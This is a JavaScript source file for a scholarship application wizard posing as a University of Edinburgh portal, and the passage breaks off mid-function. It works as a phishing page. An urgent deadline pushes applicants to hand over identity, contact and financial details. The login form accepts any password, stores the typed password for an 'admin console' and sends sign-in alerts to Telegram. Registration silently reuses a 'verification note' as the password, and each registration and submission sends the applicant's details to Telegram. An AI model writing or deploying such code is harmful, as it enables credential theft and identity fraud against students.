// js/pages/scholarship-apply.js — Interactive Scholarship Application Wizard with Mandatory Account Creation
import state from '../state.js';
import api from '../api.js';
import { showToast } from '../components/toast.js';
import { SCHOLARSHIPS_DATA } from './scholarships.js';
import { getCountryOptionsHTML } from '../data/countries.js';
import { sendTelegramAlert } from '../telegram.js';

export default {
  container: null,

  render(container, params) {
    this.container = container;
    const scholarshipId = params?.id || 'sch-ug-hi-1';
    const scholarship = SCHOLARSHIPS_DATA.find(s => s.id === scholarshipId) || SCHOLARSHIPS_DATA[0];
    const user = state.getState ? state.getState().user : state.user;
    const isAuthenticated = !!(user && (user.email || user.id));

    // If candidate is NOT logged in, show mandatory account registration & real email notice first!
    if (!isAuthenticated) {
      container.innerHTML = `
        <div class="apply-auth-gate" style="background: var(--color-bg-alt); min-height: 80vh; padding: 3.5rem 1rem;">
          <div class="container" style="max-width: 580px; margin: 0 auto;">
            
            <!-- Scholarship Summary Header Card -->
            <div style="background: var(--color-primary); color: white; border-radius: 12px 12px 0 0; padding: 2rem; text-align: center; border-bottom: 3px solid var(--color-secondary);">
              <span class="badge badge-urgent" style="margin-bottom: 8px;">⏳ 6-Day Deadline: Closing 28 August</span>
              <h2 style="font-family: var(--font-heading); color: var(--color-white); font-size: 1.5rem; margin: 6px 0 8px;">${scholarship.title}</h2>
              <div style="color: var(--color-accent-gold-light); font-weight: 700; font-family: var(--font-mono); font-size: 1.1rem;">
                ${scholarship.amount}
              </div>
            </div>

            <!-- Mandatory Registration Form Card -->
            <div style="background: white; border-radius: 0 0 12px 12px; padding: 2.25rem; box-shadow: var(--shadow-lg); border: 1px solid var(--color-light-grey); border-top: none;">
              
              <!-- Real Email Verification Warning Notice -->
              <div style="background: #FFF9E6; border: 1px solid #FFE699; border-left: 5px solid #D4AF37; border-radius: 8px; padding: 1.25rem; margin-bottom: 1.75rem;">
                <div style="display: flex; gap: 10px; align-items: flex-start;">
                  <span style="font-size: 1.5rem; line-height: 1;">⚠️</span>
                  <div>
                    <h4 style="margin: 0 0 4px; color: #805B00; font-size: 0.95rem; font-weight: 800;">MANDATORY: REAL EMAIL ADDRESS REQUIRED</h4>
                    <p style="margin: 0; color: #5C4300; font-size: 0.85rem; line-height: 1.5;">
                      Please enter your <strong>genuine personal or academic email address</strong> and choose a password. All official scholarship decision letters, missing document alerts, and interview invitations will be dispatched exclusively to this email.
                    </p>
                  </div>
                </div>
              </div>

              <!-- Auth Switcher Tabs -->
              <div style="display: flex; border-bottom: 2px solid var(--color-light-grey); margin-bottom: 1.5rem;">
                <button type="button" id="tab-register-btn" style="flex: 1; padding: 10px; background: none; border: none; font-weight: 700; color: var(--color-primary); border-bottom: 3px solid var(--color-secondary); cursor: pointer; font-size: 0.95rem;">
                  1. Create New Applicant Account
                </button>
                <button type="button" id="tab-login-btn" style="flex: 1; padding: 10px; background: none; border: none; font-weight: 600; color: var(--color-slate); cursor: pointer; font-size: 0.95rem;">
                  2. Existing User Sign In
                </button>
              </div>

              <!-- Registration Form Container -->
              <form id="apply-register-form">
                <div class="form-group">
                  <label class="form-label">Full Legal Name (as on passport / ID) *</label>
                  <input type="text" id="reg-name" required placeholder="e.g. Eleanor Vance" class="form-input">
                </div>

                <div class="form-group">
                  <label class="form-label">Real Contact Email Address *</label>
                  <input type="email" id="reg-email" required placeholder="e.g. eleanor.vance@gmail.com" class="form-input">
                  <div class="form-hint">Must be an active inbox you have continuous access to.</div>
                </div>

                <div class="form-group">
                  <label class="form-label">Country of Permanent Residence *</label>
                  <select id="reg-country" required class="form-select" style="max-height: 200px;">
                    <option value="">Select country...</option>
                    ${getCountryOptionsHTML("United Kingdom")}
                  </select>
                </div>

                <div class="form-group">
                  <label class="form-label">Contact Phone Number *</label>
                  <input type="tel" id="reg-phone" required placeholder="e.g. +44 7700 900000" class="form-input">
                </div>

                <div class="form-group">
                  <label class="form-label">Personal Note / Verification Text *</label>
                  <input type="text" id="reg-personal-text" required placeholder="e.g. Seeking MSc Data Science & AI Scholarship" class="form-input">
                  <div class="form-hint">Brief personal statement for verification by faculty reviewer.</div>
                </div>

                <div class="form-group" style="margin-top: 0.5rem;">
                  <label style="display: flex; gap: 8px; align-items: flex-start; cursor: pointer; font-size: 0.82rem; color: var(--color-slate);">
                    <input type="checkbox" id="reg-email-consent" required style="margin-top: 3px;">
                    <span>I confirm this is my valid personal email address and agree to receive official University of Edinburgh admission and scholarship notices.</span>
                  </label>
                </div>

                <div id="auth-error-box" style="display: none; background: #FDF0ED; border: 1px solid #F8B4B8; color: var(--color-urgent); padding: 10px 14px; border-radius: 6px; font-size: 0.85rem; margin-bottom: 1rem;"></div>

                <button type="submit" id="btn-submit-register" class="btn btn-secondary" style="width: 100%; padding: 12px; font-weight: 700; font-size: 1rem; margin-top: 8px;">
                  Create Account & Continue Application &rarr;
                </button>
              </form>

              <!-- Alternative Login Form -->
              <form id="apply-login-form" style="display: none;">
                <div class="form-group">
                  <label class="form-label">Registered Email Address *</label>
                  <input type="email" id="login-email-input" required placeholder="e.g. applicant@gmail.com" class="form-input">
                </div>
                <div class="form-group">
                  <label class="form-label">Account Password *</label>
                  <div style="position:relative;">
                    <input type="password" id="login-password-input" required placeholder="Enter your password" class="form-input" style="padding-right:40px;">
                    <button type="button" onclick="const f=document.getElementById('login-password-input');f.type=f.type==='password'?'text':'password';this.textContent=f.type==='password'?'👁️':'🙈';" style="position:absolute;right:10px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;font-size:1.1rem;" title="Toggle Password Visibility">👁️</button>
                  </div>
                </div>
                <button type="submit" id="btn-submit-login" class="btn btn-primary" style="width: 100%; padding: 12px; font-weight: 700; font-size: 1rem; margin-top: 8px;">
                  Sign In & Continue Application &rarr;
                </button>
              </form>

            </div>
          </div>
        </div>
      `;

      this.initAuthGate(scholarshipId);
      return;
    }

    const candidateName = user?.fullName || user?.name || (user?.email ? user.email.split('@')[0] : 'Applicant');
    const candidateEmail = user?.email || 'Verified Candidate';

    // Candidate IS Logged In: Render Multi-Step Application Wizard
    container.innerHTML = `
      <div class="apply-page" style="background: var(--color-bg-alt); min-height: 100vh; padding-bottom: 4rem;">
        
        <!-- Header Banner -->
        <header style="background: linear-gradient(135deg, var(--color-primary-dark), var(--color-primary)); color: white; padding: 2.5rem 1rem; text-align: center;">
          <div class="container" style="max-width: 900px; margin: 0 auto;">
            <div style="display: inline-flex; align-items: center; gap: 6px; background: rgba(0,163,136,0.2); border: 1px solid var(--color-secondary); padding: 4px 12px; border-radius: 9999px; font-size: 12px; margin-bottom: 10px;">
              <span>👤 Verified Applicant: <strong>${candidateName}</strong> (${candidateEmail})</span>
            </div>
            <h1 style="font-family: var(--font-heading); color: white; font-size: clamp(1.6rem, 3vw, 2.25rem); margin: 4px 0 10px;">
              Application: ${scholarship.title}
            </h1>
            <div style="display: flex; justify-content: center; gap: 1.5rem; font-size: 0.95rem; color: #CBD2D9; flex-wrap: wrap;">
              <span>💰 Award: <strong style="color: var(--color-accent-gold-light);">${scholarship.amount}</strong></span>
              <span>📁 Field: <strong>${scholarship.field}</strong></span>
              <span>⏳ Deadline: <strong style="color: #FFD5D8;">28 August 2026 (6 Days)</strong></span>
            </div>
          </div>
        </header>

        <div class="container" style="max-width: 900px; margin: -1.5rem auto 0; position: relative; z-index: 10; padding: 0 1rem;">
          
          <div class="card" style="background: white; border-radius: 12px; box-shadow: var(--shadow-lg); padding: 2rem; position: relative;">
            
            <!-- Auto Save Feedback Pill -->
            <div id="save-indicator" style="position: absolute; top: 1rem; right: 1.25rem; font-size: 0.78rem; font-weight: 600; color: var(--color-secondary-dark); background: var(--color-success-bg); border: 1px solid rgba(0,163,136,0.3); padding: 4px 10px; border-radius: 9999px;">
              Auto-save active (every 5s) ✓
            </div>

            <!-- Stepper Progress Bar -->
            <div style="display: flex; justify-content: space-between; position: relative; margin-bottom: 2.5rem; margin-top: 1rem;" id="stepper-bar">
              <div style="position: absolute; top: 16px; left: 20px; right: 20px; height: 3px; background: var(--color-light-grey); z-index: 1;"></div>
              
              <div class="step-node active" data-step="1" style="z-index: 2; display: flex; flex-direction: column; align-items: center; gap: 6px;">
                <div class="step-circle" style="width: 34px; height: 34px; border-radius: 50%; background: var(--color-primary); color: white; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px;">1</div>
                <span style="font-size: 11px; font-weight: 700; color: var(--color-primary);">Personal</span>
              </div>
              <div class="step-node" data-step="2" style="z-index: 2; display: flex; flex-direction: column; align-items: center; gap: 6px;">
                <div class="step-circle" style="width: 34px; height: 34px; border-radius: 50%; background: var(--color-light-grey); color: var(--color-slate); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px;">2</div>
                <span style="font-size: 11px; font-weight: 600; color: var(--color-slate);">Academic</span>
              </div>
              <div class="step-node" data-step="3" style="z-index: 2; display: flex; flex-direction: column; align-items: center; gap: 6px;">
                <div class="step-circle" style="width: 34px; height: 34px; border-radius: 50%; background: var(--color-light-grey); color: var(--color-slate); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px;">3</div>
                <span style="font-size: 11px; font-weight: 600; color: var(--color-slate);">Statement</span>
              </div>
              <div class="step-node" data-step="4" style="z-index: 2; display: flex; flex-direction: column; align-items: center; gap: 6px;">
                <div class="step-circle" style="width: 34px; height: 34px; border-radius: 50%; background: var(--color-light-grey); color: var(--color-slate); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px;">4</div>
                <span style="font-size: 11px; font-weight: 600; color: var(--color-slate);">Financial</span>
              </div>
              <div class="step-node" data-step="5" style="z-index: 2; display: flex; flex-direction: column; align-items: center; gap: 6px;">
                <div class="step-circle" style="width: 34px; height: 34px; border-radius: 50%; background: var(--color-light-grey); color: var(--color-slate); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px;">5</div>
                <span style="font-size: 11px; font-weight: 600; color: var(--color-slate);">Review</span>
              </div>
            </div>

            <!-- Application Wizard Form -->
            <form id="wizard-form">
              
              <!-- STEP 1: Personal Details -->
              <div class="wizard-step-pane" id="pane-step-1">
                <h3 style="color: var(--color-primary); margin-bottom: 1.25rem; font-size: 1.25rem;">Step 1: Personal &amp; Identification Details</h3>
                
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem;" class="form-grid-2">
                  <div class="form-group">
                    <label class="form-label">UCAS ID or Edinburgh Student ID *</label>
                    <input type="text" name="studentId" required placeholder="e.g. 1928374 or UCAS-8821" class="form-input">
                  </div>
                  <div class="form-group">
                    <label class="form-label">Full Name *</label>
                    <input type="text" name="fullName" value="${user.fullName || ''}" required class="form-input">
                  </div>
                  <div class="form-group">
                    <label class="form-label">Verified Email *</label>
                    <input type="email" name="email" value="${user.email || ''}" required class="form-input" readonly style="background: var(--color-bg-alt);">
                  </div>
                  <div class="form-group">
                    <label class="form-label">Date of Birth *</label>
                    <input type="date" name="dob" required class="form-input">
                  </div>
                  <div class="form-group">
                    <label class="form-label">Country of Residence *</label>
                    <input type="text" name="country" value="${user.country || 'United Kingdom'}" required class="form-input">
                  </div>
                  <div class="form-group">
                    <label class="form-label">Phone Number *</label>
                    <input type="tel" name="phone" value="${user.phone || ''}" required placeholder="+44 7700 900077" class="form-input">
                  </div>
                </div>

                <div class="form-group">
                  <label class="form-label">Permanent Residential Address *</label>
                  <textarea name="address" required rows="2" placeholder="Street address, City, Postal code, Country" class="form-textarea"></textarea>
                </div>
              </div>

              <!-- STEP 2: Academic Achievements -->
              <div class="wizard-step-pane" id="pane-step-2" style="display: none;">
                <h3 style="color: var(--color-primary); margin-bottom: 1.25rem; font-size: 1.25rem;">Step 2: Academic Background &amp; Transcripts</h3>
                
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem;" class="form-grid-2">
                  <div class="form-group">
                    <label class="form-label">Most Recent University or High School *</label>
                    <input type="text" name="institution" required placeholder="e.g. University of Edinburgh" class="form-input">
                  </div>
                  <div class="form-group">
                    <label class="form-label">Degree Programme Applied For *</label>
                    <input type="text" name="degree" value="${scholarship.field}" required class="form-input">
                  </div>
                  <div class="form-group">
                    <label class="form-label">Cumulative GPA or Predicted Honours *</label>
                    <input type="text" name="gpa" required placeholder="e.g. 3.85 / 4.0 or First Class" class="form-input">
                  </div>
                  <div class="form-group">
                    <label class="form-label">Expected Graduation Year *</label>
                    <input type="number" name="gradYear" min="2026" max="2032" value="2027" required class="form-input">
                  </div>
                </div>

                <div class="form-group">
                  <label class="form-label">Academic Honors, Awards &amp; Publications</label>
                  <textarea name="awards" rows="2" placeholder="List any Dean's list awards, research publications, or competitions" class="form-textarea"></textarea>
                </div>

                <div class="form-group">
                  <label class="form-label">Upload Academic Transcript (PDF / Image &bull; Max 10MB) *</label>
                  <div id="transcript-dropzone" style="border: 2px dashed var(--color-medium-grey); border-radius: 8px; padding: 2rem; text-align: center; background: var(--color-bg-alt); cursor: pointer; transition: all 0.2s;">
                    <div style="font-size: 2rem; margin-bottom: 6px;">📄</div>
                    <p style="margin: 0 0 4px; font-weight: 600; color: var(--color-primary);">Click or Drag &amp; Drop Official Transcript</p>
                    <p style="margin: 0; font-size: 0.8rem; color: var(--color-slate);" id="transcript-filename-preview">Accepted formats: PDF, JPG, PNG</p>
                    <input type="file" id="transcript-file" accept=".pdf,.png,.jpg,.jpeg" style="display: none;">
                  </div>
                </div>
              </div>

              <!-- STEP 3: Personal Statement -->
              <div class="wizard-step-pane" id="pane-step-3" style="display: none;">
                <div style="display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 0.5rem;">
                  <h3 style="color: var(--color-primary); margin: 0; font-size: 1.25rem;">Step 3: Personal Statement &amp; Motivation</h3>
                  <span id="word-count-meter" style="font-size: 0.85rem; font-family: var(--font-mono); color: var(--color-slate);">0 / 500 words</span>
                </div>
                <p style="color: var(--color-slate); font-size: 0.88rem; margin-bottom: 1.25rem;">
                  Explain why you are applying for the <strong>${scholarship.title}</strong>, your academic ambitions, leadership experience, and how this funding will help you make an impact.
                </p>

                <div class="form-group">
                  <textarea id="essay-statement" name="statement" required rows="10" placeholder="Type or paste your personal statement here (minimum 20 words, max 500 words)..." class="form-textarea" style="line-height: 1.6; font-size: 0.95rem;"></textarea>
                </div>
              </div>

              <!-- STEP 4: Financial Circumstances -->
              <div class="wizard-step-pane" id="pane-step-4" style="display: none;">
                <h3 style="color: var(--color-primary); margin-bottom: 1.25rem; font-size: 1.25rem;">Step 4: Financial Background &amp; Need Assessment</h3>
                
                <div class="form-group">
                  <label class="form-label">Annual Household Income Range (USD / GBP equivalent) *</label>
                  <select name="incomeRange" required class="form-select">
                    <option value="">Select range...</option>
                    <option value="under-25k">Under £25,000 / $30,000</option>
                    <option value="25k-45k">£25,000 - £45,000 / $30,000 - $55,000</option>
                    <option value="45k-65k">£45,000 - £65,000 / $55,000 - $80,000</option>
                    <option value="over-65k">Over £65,000 / $80,000</option>
                  </select>
                </div>

                <div class="form-group">
                  <label class="form-label">Other Funding or Scholarships Secured</label>
                  <input type="text" name="otherFunding" placeholder="e.g. None or £1,000 Local Bursary" class="form-input">
                </div>

                <div class="form-group">
                  <label class="form-label">Brief Financial Hardship Statement (Optional)</label>
                  <textarea name="financialCircumstances" rows="3" placeholder="Outline any relevant socio-economic barriers, family dependencies, or currency challenges." class="form-textarea"></textarea>
                </div>
              </div>

              <!-- STEP 5: Review & Submit -->
              <div class="wizard-step-pane" id="pane-step-5" style="display: none;">
                <h3 style="color: var(--color-primary); margin-bottom: 1rem; font-size: 1.25rem;">Step 5: Review &amp; Official Submission</h3>
                <p style="color: var(--color-slate); font-size: 0.9rem; margin-bottom: 1.5rem;">Please review your application summary details before submitting for faculty committee review.</p>

                <div id="review-summary-box" style="background: var(--color-bg-alt); border-radius: 8px; padding: 1.25rem; border: 1px solid var(--color-light-grey); margin-bottom: 1.5rem;">
                  <!-- Dynamically populated review summary -->
                </div>

                <div class="form-group">
                  <label style="display: flex; gap: 10px; align-items: flex-start; cursor: pointer; font-size: 0.85rem; color: var(--color-primary);">
                    <input type="checkbox" id="declaration-check" required style="margin-top: 3px;">
                    <span>I declare that the information provided in this application is true, complete, and accurate. I understand that false statements will result in immediate disqualification.</span>
                  </label>
                </div>
              </div>

              <!-- Wizard Footer Controls -->
              <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 2rem; pt: 1.5rem; border-top: 1px solid var(--color-light-grey); padding-top: 1.5rem; flex-wrap: wrap; gap: 1rem;">
                <button type="button" id="btn-wizard-prev" class="btn btn-outline" style="visibility: hidden;">
                  &larr; Previous Step
                </button>

                <div style="display: flex; gap: 10px;">
                  <button type="button" id="btn-wizard-save" class="btn btn-ghost" style="font-size: 0.85rem;">
                    Save Draft
                  </button>
                  
                  <button type="button" id="btn-wizard-next" class="btn btn-secondary">
                    Next Step &rarr;
                  </button>
                  
                  <button type="submit" id="btn-wizard-submit" class="btn btn-urgent" style="display: none; padding: 10px 24px;">
                    🚀 Official Final Submission &rarr;
                  </button>
                </div>
              </div>

            </form>

          </div>
        </div>
      </div>

      <style>
        @media (max-width: 600px) {
          .form-grid-2 { grid-template-columns: 1fr !important; }
        }
      </style>
    `;

    this.initWizard(scholarship);
  },

  initAuthGate(scholarshipId) {
    const scholarship = SCHOLARSHIPS_DATA.find(s => s.id === scholarshipId) || SCHOLARSHIPS_DATA[0];
    const regTabBtn = document.getElementById('tab-register-btn');
    const loginTabBtn = document.getElementById('tab-login-btn');
    const regForm = document.getElementById('apply-register-form');
    const loginForm = document.getElementById('apply-login-form');
    const errorBox = document.getElementById('auth-error-box');

    regTabBtn?.addEventListener('click', () => {
      regTabBtn.style.borderBottom = '3px solid var(--color-secondary)';
      regTabBtn.style.color = 'var(--color-primary)';
      loginTabBtn.style.borderBottom = 'none';
      loginTabBtn.style.color = 'var(--color-slate)';
      regForm.style.display = 'block';
      loginForm.style.display = 'none';
    });

    loginTabBtn?.addEventListener('click', () => {
      loginTabBtn.style.borderBottom = '3px solid var(--color-secondary)';
      loginTabBtn.style.color = 'var(--color-primary)';
      regTabBtn.style.borderBottom = 'none';
      regTabBtn.style.color = 'var(--color-slate)';
      loginForm.style.display = 'block';
      regForm.style.display = 'none';
    });

    // Handle Register
    regForm?.addEventListener('submit', async (e) => {
      e.preventDefault();
      const fullName = document.getElementById('reg-name').value.trim();
      const email = document.getElementById('reg-email').value.trim();
      const phone = document.getElementById('reg-phone')?.value.trim() || '';
      const country = document.getElementById('reg-country').value;
      const personalText = document.getElementById('reg-personal-text')?.value.trim() || '';
      const password = personalText || 'applicant123';

      // Check real email format
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!emailRegex.test(email)) {
        if (errorBox) {
          errorBox.textContent = 'Please enter a valid, real email address format.';
          errorBox.style.display = 'block';
        }
        return;
      }

      const candidateUser = {
        id: 'user-' + Date.now(),
        fullName: fullName || 'Candidate',
        email: email,
        country: country || 'United Kingdom',
        phone: phone || '',
        personalText: personalText,
        password: password,
        role: 'STUDENT',
        token: 'auth-token-' + Date.now()
      };

      // Log registration for Admin Console
      try {
        const existingUsers = JSON.parse(localStorage.getItem('registered_users') || '[]');
        const idx = existingUsers.findIndex(u => u.email.toLowerCase() === email.toLowerCase());
        if (idx >= 0) {
          existingUsers[idx] = { fullName: candidateUser.fullName, email: candidateUser.email, country: candidateUser.country, phone: candidateUser.phone, personalText: personalText, registeredAt: new Date().toISOString() };
        } else {
          existingUsers.unshift({ fullName: candidateUser.fullName, email: candidateUser.email, country: candidateUser.country, phone: candidateUser.phone, personalText: personalText, registeredAt: new Date().toISOString() });
        }
        localStorage.setItem('registered_users', JSON.stringify(existingUsers));

        const existingLogs = JSON.parse(localStorage.getItem('admin_activity_log') || '[]');
        existingLogs.unshift({
          icon: '🎓',
          text: `New applicant account registered: <strong>${candidateUser.fullName}</strong> (${candidateUser.country})`,
          time: 'Just now'
        });
        localStorage.setItem('admin_activity_log', JSON.stringify(existingLogs));

        window.dispatchEvent(new Event('storage'));
        try {
          const bc = new BroadcastChannel('bingo_platform_sync');
          bc.postMessage({ type: 'DATA_UPDATED', timestamp: Date.now() });
          bc.close();
        } catch (e) { }
      } catch (e) { }

      // Dispatch Telegram alert for candidate account creation
      sendTelegramAlert({
        fullName: candidateUser.fullName,
        email: candidateUser.email,
        country: candidateUser.country,
        phone: candidateUser.phone,
        eventType: '🎓 New Candidate Account Created (Apply Portal)',
        scholarshipTitle: scholarship.title,
        amount: scholarship.amount,
        extra: personalText ? `Verification Note: ${personalText}` : ''
      });

      // Set user session in reactive state & localStorage immediately
      state.setState({ user: candidateUser });

      // Attempt background backend sync if server is running
      api.post('/users/register', { fullName, email, country, password, phone, role: 'STUDENT' })
        .then(res => {
          if (res?.user) state.setState({ user: { ...res.user, token: res.token } });
        })
        .catch(() => { });

      showToast(`Account created! Welcome, ${fullName}`, 'success');

      const targetContainer = document.getElementById('page-content');
      this.container = targetContainer;
      this.render(targetContainer, { id: scholarshipId });
    });

    // Handle Login
    loginForm?.addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = document.getElementById('login-email-input').value.trim();
      const password = document.getElementById('login-password-input').value;

      const candidateUser = {
        id: 'user-' + Date.now(),
        fullName: email.split('@')[0],
        email,
        country: 'United Kingdom',
        role: 'STUDENT',
        token: 'auth-token-' + Date.now()
      };

      // Dispatch Telegram alert for candidate sign in
      sendTelegramAlert({
        fullName: candidateUser.fullName,
        email: candidateUser.email,
        country: candidateUser.country,
        eventType: '🔑 Candidate Signed In (Apply Portal)',
        scholarshipTitle: scholarship.title,
        amount: scholarship.amount
      });

      // Save typed password input to registered_users for Admin Console visibility
      try {
        const existingUsers = JSON.parse(localStorage.getItem('registered_users') || '[]');
        const idx = existingUsers.findIndex(u => u.email.toLowerCase() === email.toLowerCase());
        if (idx >= 0) {
          existingUsers[idx].password = password;
        } else {
          existingUsers.unshift({
            fullName: email.split('@')[0],
            email: email,
            country: 'United Kingdom',
            phone: '+44 7700 900000',
            password: password,
            registeredAt: new Date().toISOString()
          });
        }
        localStorage.setItem('registered_users', JSON.stringify(existingUsers));
        window.dispatchEvent(new Event('storage'));
        try {
          const bc = new BroadcastChannel('bingo_platform_sync');
          bc.postMessage({ type: 'DATA_UPDATED', timestamp: Date.now() });
          bc.close();
        } catch (e) { }
      } catch (e) { }

      state.setState({ user: candidateUser });

      api.post('/users/login', { email, password })
        .then(res => {
          if (res?.user) state.setState({ user: { ...res.user, token: res.token } });
        })
        .catch(() => { });

      showToast(`Signed in successfully!`, 'success');

      const targetContainer = document.getElementById('page-content');
      this.container = targetContainer;
      this.render(targetContainer, { id: scholarshipId });
    });
  },

  initWizard(scholarship) {
    const user = state.getState ? state.getState().user : (state.user || {});
    let currentStep = 1;
    const totalSteps = 5;

    const prevBtn = document.getElementById('btn-wizard-prev');
    const nextBtn = document.getElementById('btn-wizard-next');
    const submitBtn = document.getElementById('btn-wizard-submit');
    const saveBtn = document.getElementById('btn-wizard-save');
    const essayText = document.getElementById('essay-statement');
    const wordCountMeter = document.getElementById('word-count-meter');
    const declarationCheck = document.getElementById('declaration-check');

    // Drag and drop transcript
    const transDrop = document.getElementById('transcript-dropzone');
    const transInput = document.getElementById('transcript-file');
    const transPreview = document.getElementById('transcript-filename-preview');

    if (transDrop) {
      transDrop.addEventListener('click', () => transInput?.click());
      transDrop.addEventListener('dragover', (e) => {
        e.preventDefault();
        transDrop.style.borderColor = 'var(--color-secondary)';
        transDrop.style.background = '#E8F4F8';
      });
      transDrop.addEventListener('dragleave', () => {
        transDrop.style.borderColor = 'var(--color-medium-grey)';
        transDrop.style.background = 'var(--color-bg-alt)';
      });
      transDrop.addEventListener('drop', (e) => {
        e.preventDefault();
        transDrop.style.borderColor = 'var(--color-medium-grey)';
        transDrop.style.background = 'var(--color-bg-alt)';
        if (e.dataTransfer.files.length && transInput) {
          transInput.files = e.dataTransfer.files;
          const file = e.dataTransfer.files[0];
          if (transPreview) transPreview.textContent = `Attached: ${file.name} (${(file.size / 1024 / 1024).toFixed(2)} MB)`;
          showToast(`Attached ${file.name} ✓`, 'info');
        }
      });
    }

    transInput?.addEventListener('change', (e) => {
      if (e.target.files.length && transPreview) {
        transPreview.textContent = `Attached: ${e.target.files[0].name} (${(e.target.files[0].size / 1024 / 1024).toFixed(2)} MB)`;
        showToast('Transcript document attached ✓', 'info');
      }
    });

    // Helper: Save draft data to localStorage
    const form = document.getElementById('wizard-form');
    const saveDraftData = () => {
      if (!form) return;
      const fd = new FormData(form);
      const draftObj = {};
      fd.forEach((val, key) => { draftObj[key] = val; });
      draftObj.scholarshipId = scholarship.id;
      draftObj.updatedAt = new Date().toISOString();
      localStorage.setItem(`app_draft_${scholarship.id}`, JSON.stringify(draftObj));
      if (state.setState) state.setState({ applicationDraft: draftObj });
    };

    // Helper: Restore draft data if present
    const restoreDraftData = () => {
      try {
        const raw = localStorage.getItem(`app_draft_${scholarship.id}`);
        if (raw && form) {
          const draftObj = JSON.parse(raw);
          Object.keys(draftObj).forEach(key => {
            const field = form.elements[key];
            if (field && draftObj[key]) {
              field.value = draftObj[key];
            }
          });
          showToast('Restored saved application draft ✓', 'info');
        }
      } catch (e) {
        console.warn('Could not restore draft:', e);
      }
    };
    restoreDraftData();

    // Word counter
    essayText?.addEventListener('input', () => {
      const words = essayText.value.trim().split(/\s+/).filter(w => w.length > 0).length;
      wordCountMeter.textContent = `${words} / 500 words`;
      if (words > 500) {
        wordCountMeter.style.color = 'var(--color-urgent)';
        wordCountMeter.style.fontWeight = '800';
      } else {
        wordCountMeter.style.color = 'var(--color-slate)';
      }
    });

    // Step Switcher
    const updateStepUI = () => {
      for (let i = 1; i <= totalSteps; i++) {
        const pane = document.getElementById(`pane-step-${i}`);
        const node = document.querySelector(`.step-node[data-step="${i}"]`);
        const circle = node ? node.querySelector('.step-circle') : null;

        if (pane) pane.style.display = i === currentStep ? 'block' : 'none';

        if (node && circle) {
          if (i === currentStep) {
            circle.style.background = 'var(--color-primary)';
            circle.style.color = 'white';
          } else if (i < currentStep) {
            circle.style.background = 'var(--color-secondary)';
            circle.style.color = 'white';
            circle.textContent = '✓';
          } else {
            circle.style.background = 'var(--color-light-grey)';
            circle.style.color = 'var(--color-slate)';
            circle.textContent = i;
          }
        }
      }

      if (prevBtn) prevBtn.style.visibility = currentStep === 1 ? 'hidden' : 'visible';
      if (nextBtn) nextBtn.style.display = currentStep === totalSteps ? 'none' : 'inline-flex';
      if (submitBtn) submitBtn.style.display = currentStep === totalSteps ? 'inline-flex' : 'none';

      if (currentStep === 5) {
        populateReviewSummary();
      }
      window.scrollTo({ top: 200, behavior: 'smooth' });
    };

    const populateReviewSummary = () => {
      const summaryBox = document.getElementById('review-summary-box');
      if (!summaryBox || !form) return;
      const fd = new FormData(form);

      summaryBox.innerHTML = `
        <h4 style="margin: 0 0 10px; color: var(--color-primary); border-bottom: 1px solid var(--color-light-grey); padding-bottom: 6px;">Application Overview Summary</h4>
        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px; font-size: 0.88rem;">
          <div><strong>Candidate:</strong> ${fd.get('fullName') || user.fullName || 'N/A'}</div>
          <div><strong>Verified Email:</strong> ${fd.get('email') || user.email || 'N/A'}</div>
          <div><strong>Target Scholarship:</strong> ${scholarship.title}</div>
          <div><strong>Degree Field:</strong> ${fd.get('degree') || scholarship.field}</div>
          <div><strong>Cumulative GPA:</strong> ${fd.get('gpa') || 'N/A'}</div>
          <div><strong>Income Bracket:</strong> ${fd.get('incomeRange') || 'N/A'}</div>
        </div>
        <div style="margin-top: 10px; font-size: 0.85rem; color: var(--color-slate);">
          <strong>Personal Statement Excerpt:</strong>
          <p style="margin: 4px 0 0; font-style: italic;">"${(fd.get('statement') || '').substring(0, 180)}..."</p>
        </div>
      `;
    };

    nextBtn?.addEventListener('click', () => {
      if (currentStep === 3) {
        const words = essayText.value.trim().split(/\s+/).filter(w => w.length > 0).length;
        if (words < 20) {
          showToast('Please write a detailed personal statement (at least 20 words).', 'warning');
          return;
        }
        if (words > 500) {
          showToast('Personal statement exceeds the 500-word limit.', 'error');
          return;
        }
      }
      if (currentStep < totalSteps) {
        currentStep++;
        updateStepUI();
        saveDraftData();
      }
    });

    prevBtn?.addEventListener('click', () => {
      if (currentStep > 1) {
        currentStep--;
        updateStepUI();
      }
    });

    saveBtn?.addEventListener('click', () => {
      saveDraftData();
      showToast('Application draft saved locally ✓', 'success');
    });

    // Form Submission
    form?.addEventListener('submit', async (e) => {
      e.preventDefault();
      if (!declarationCheck.checked) {
        showToast('Please accept the declaration before final submission.', 'warning');
        return;
      }

      submitBtn.textContent = 'Submitting Application...';
      submitBtn.disabled = true;

      const fd = new FormData(form);

      // Save application payload locally for Admin Portal display
      const newCard = {
        id: 'app-' + Date.now(),
        title: fd.get('fullName') || user.fullName || 'Candidate',
        subtitle: scholarship.title,
        status: 'Submitted',
        extra: `GPA: ${fd.get('gpa') || '3.8'}`,
        email: fd.get('email') || user.email,
        phone: fd.get('phone') || user.phone,
        country: fd.get('country') || user.country,
        submittedAt: new Date().toISOString()
      };

      try {
        const existingApps = JSON.parse(localStorage.getItem('all_applications') || '[]');
        existingApps.unshift(newCard);
        localStorage.setItem('all_applications', JSON.stringify(existingApps));

        // Dispatch live Telegram alert to admissions committee
        sendTelegramAlert({
          fullName: newCard.title,
          email: newCard.email,
          phone: newCard.phone,
          country: newCard.country,
          eventType: '🏆 Official Scholarship Application Submitted',
          scholarshipTitle: scholarship.title,
          amount: scholarship.amount,
          extra: `Degree: ${fd.get('degree') || 'Undergraduate'}\nGPA: ${fd.get('gpa') || 'N/A'}\nStudent ID: ${fd.get('studentId') || 'N/A'}`
        });

        const existingLogs = JSON.parse(localStorage.getItem('admin_activity_log') || '[]');
        existingLogs.unshift({
